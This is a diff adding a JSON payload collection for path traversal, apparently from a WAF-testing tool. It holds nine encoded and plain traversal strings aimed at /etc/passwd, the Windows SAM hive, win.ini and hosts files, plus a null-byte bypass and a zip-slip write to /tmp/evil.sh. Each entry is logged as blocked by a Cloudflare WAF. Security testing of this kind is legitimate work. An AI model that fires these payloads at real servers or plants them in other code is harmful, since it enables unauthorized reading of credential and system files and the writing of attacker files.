@@ -1,0 +1,133 @@
+{
+  "category": "path_traversal",
+  "subcategory": "advanced",
+  "count": 9,
+  "payloads": [
+    {
+      "id": "path_traversal-1001",
+      "category": "path_traversal",
+      "subcategory": "advanced",
+      "payload": "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+      "description": "Unicode overlong encoding",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-1002",
+      "category": "path_traversal",
+      "subcategory": "advanced",
+      "payload": "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "description": "Double URL encoding",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-1003",
+      "category": "path_traversal",
+      "subcategory": "advanced",
+      "payload": "..%c0%af..%c0%afetc%c0%afpasswd",
+      "description": "UTF-8 slash encoding",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-1004",
+      "category": "path_traversal",
+      "subcategory": "advanced",
+      "payload": "..\\..\\..\\windows\\system32\\config\\sam",
+      "description": "Windows SAM file",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-1005",
+      "category": "path_traversal",
+      "subcategory": "advanced",
+      "payload": "..\\..\\..\\windows\\win.ini",
+      "description": "Windows win.ini",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-1006",
+      "category": "path_traversal",
+      "subcategory": "advanced",
+      "payload": "../../etc/passwd%00.jpg",
+      "description": "Null byte bypass",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-1007",
+      "category": "path_traversal",
+      "subcategory": "advanced",
+      "payload": "/etc/passwd",
+      "description": "Absolute path Linux",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-1008",
+      "category": "path_traversal",
+      "subcategory": "advanced",
+      "payload": "C:\\windows\\system32\\drivers\\etc\\hosts",
+      "description": "Absolute path Windows",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "path_traversal-1009",
+      "category": "path_traversal",
+      "subcategory": "advanced",
+      "payload": "../../../../tmp/evil.sh",
+      "description": "Zip slip",
+      "technique": "advanced",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
